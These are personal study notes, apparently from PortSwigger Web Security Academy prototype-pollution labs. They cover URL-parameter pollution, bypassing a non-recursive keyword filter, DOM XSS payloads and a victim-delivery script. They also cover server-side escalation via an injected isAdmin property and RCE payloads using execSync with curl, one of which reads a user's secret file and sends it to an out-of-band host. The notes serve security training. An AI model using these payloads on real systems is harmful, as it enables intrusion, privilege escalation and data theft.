```
Use DOM Invader with prototype pollution function to automate the search while navigating


manual tests:
/?__proto__[foo]=bar 
/?constructor.prototype.foo=bar


Avoid filter by commenting the url with a '-' at the end


Spot filter on js script
let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
-> Not recursive
-> /?__pro__proto__to__[foo]=bar
-> /?__pro__proto__to__.foo=bar 
-> /?constconstructorructor[protoprototypetype][foo]=bar 
-> /?constconstructorructor.protoprototypetype.foo=bar
(all work)
-> identify sink: script.src = config.transport_url;
-> exploit: /?__pro__proto__to__[transport_url]=data:,alert(1);


Deliver to victim a prototype pollution XSS
<script>
 location="https://0aba00c003066a7a814d89c100fc0030.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
</script>


Priv Escalation:
Update settings request shows isadmin value in response
Can be modified in burpsuite, adding:
"__proto__": { "foo":"bar" }
this will add the foo param

restart node and update isAdmin value to true
"__proto__":{"isAdmin":true}



No reflection
-> "__proto__":{"status":555}
-> Force an error (remove a coma) and check if status object has been updated to 555



Try updating spaces:
"__proto__": { "json spaces":10 }
"constructor": { "prototype": { "json spaces":10 } }
-> In response switch to Raw to check indentation
-> "constructor": { "prototype": { "isAdmin":true } }



RCE
Pollute user settings
"__proto__": {
 "execPath":"curl","execArgv":["https://YOUR-COLLABORATOR-ID.oastify.com","."]
}

or the one of this lab:

"__proto__": {
    "execArgv":["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}

After that, trigger admin job to trigger the execArgv


carlos secret??

"__proto__": { "shell":"vim", "input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n" }
```

##### Automation guide:
1. Load the lab in Burp's built-in browser.
2. [Enable DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/enabling) and [enable the prototype pollution option](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution#enabling-prototype-pollution).
3. Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
4. Observe that DOM Invader has identified two prototype pollution vectors in the `search` property i.e. the query string.
5. Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
6. When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
7. Observe that DOM Invader has successfully accessed the `script.src` sink via the `value` gadget.
8. Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.
##### To manually test:
- `/?__proto__[foo]=bar`
- Object.prototype on the console to see if foo is injected
- Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks. Ex: `Object.defineProperty()` method to make the `transport_url` unwritable and unconfigurable
- - Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
    `/?__proto__[value]=data:,alert(1);`



##### If filter is appended:
1. Go back to the previous browser tab and look at the `eval()` sink again in DOM Invader. Notice that following the closing canary string, a numeric `1` character has been appended to the payload.
2. Click **Exploit** again. In the new tab that loads, append a minus character (`-`) to the URL and reload the page.
3. Observe that the `alert(1)` is called and the lab is solved.

##### rstrip filter
1. Go to the **Sources** tab and study the JavaScript files that are loaded by the target site. Notice that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. However, it does not apply this filter recursively.
2. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For 
    `/?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar /?constconstructorructor[protoprototypetype][foo]=bar /?constconstructorructor.protoprototypetype.foo=bar`
3. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
4. Find transport_url is appended to the config object
	`__pro__proto__to__[transport_url]=data:,alert(1);`

##### Deliver to victim
```js
<script>
 location="https://0aba00c003066a7a814d89c100fc0030.web-security-academy.net/#__proto__[hitCallback]=alert%281%29"
</script>
```

##### Privilege escalaion
```
Update settings can be modified in burpsuite, adding:
"__proto__": { "foo":"bar" }
this will add the foo param

restart node and update isAdmin value to true
"__proto__": { isAdmin:true }
```
![[Pasted image 20240208221121.png]]

##### Force an error
remove the coma of the previous setting and update the status to 500
```
"__proto__":{"status":555}
```


##### If settings are reflected in JSON
try updating spaces:
```
"__proto__": { "json spaces":10 }

"constructor": { "prototype": { "json spaces":10 } }
```


##### prototype pollution RCE
```
"__proto__": {
 "execPath":"curl","execArgv":["https://YOUR-COLLABORATOR-ID.oastify.com","."]
}

or the one of this lab:

"__proto__": {
    "execArgv":["--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
}

```
run maintainance jobs from admin panel to trigger execArgv that is polluted


